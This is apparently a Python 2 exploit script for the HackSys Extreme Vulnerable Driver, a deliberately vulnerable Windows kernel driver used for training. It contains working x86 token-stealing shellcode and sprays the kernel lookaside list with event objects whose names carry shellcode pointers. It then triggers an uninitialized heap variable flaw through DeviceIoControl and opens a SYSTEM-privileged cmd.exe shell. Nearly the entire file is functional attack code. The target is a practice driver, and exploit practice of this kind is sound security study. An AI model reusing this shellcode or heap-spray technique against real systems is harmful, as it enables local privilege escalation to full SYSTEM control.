import ctypes, os, struct, sys, win32con
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32

def heap_alloc_payload():
	token_stealing_shellcode = (
		#---[Setup]
		"\x60"                      # pushad
		"\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
		"\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
		#---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
		"\x75\xED"                  # jnz                           ->|
		"\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
		#---[Recover]
		"\x61"                      # popad
		"\xC3"              		# ret
	)
	
	payload_address = id(token_stealing_shellcode) + 20
	print "[+] Payload address: 0x%X" % payload_address
	return payload_address

	
event_objects_array = []
	
def tainting_lookaside():	
	print "[+] Tainting lookaside"
	payload_address = heap_alloc_payload()
	lpName = struct.pack("<L", payload_address) * (0x3B)
	print "[+] Allocating 256 Event Objects with lpName of size 0xF0" 
	print "    - shellcode pointer (4) * 0x3B"
	for x in range(256):
		nonce = str(x).zfill(4)
		event_objects_array.append(kernel32.CreateEventW(None,True,False,c_char_p(lpName + nonce)))
	print "[+] Freeing all Event Objects"
	for x in range(len(event_objects_array)):
		kernel32.CloseHandle(event_objects_array[x])
	
def trigger_uninitialized_heap_variable():
	dwReturn      = c_ulong()
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
		sys.exit()
	
	magicvalue = struct.pack('<I', 0xBAD0B0B1)
	magicvalue_ptr = id(magicvalue) + 20
	magicvalue_size  = len(magicvalue)
	
	tainting_lookaside()
	print "[+] Triggering vuln .."
	kernel32.DeviceIoControl(driver_handle, 0x00222033, magicvalue_ptr, magicvalue_size, None, 0,byref(dwReturn), None)
	
	if shell.IsUserAnAdmin():
		print "[*] Enjoy Elevated Privs !\r\n"
		os.system('cmd.exe')
	else:
		print "[-] Exploit did not work. Re-run it!"
	

def preamble():
	print "\r\n"
	print "HackSys Extreme Vulnerable Driver : Uninitialized Heap Variable"
	print "Author: @GradiusX"
	print "References: http://dokydoky.tistory.com/445 (All kudos for technique)"
	print "\r\n"
	raw_input("[!] This exploit is not 100% reliable.\r\n[!] Press RETURN to continue at your own risk ..")
	
	
if __name__ == '__main__':
	preamble()
	trigger_uninitialized_heap_variable()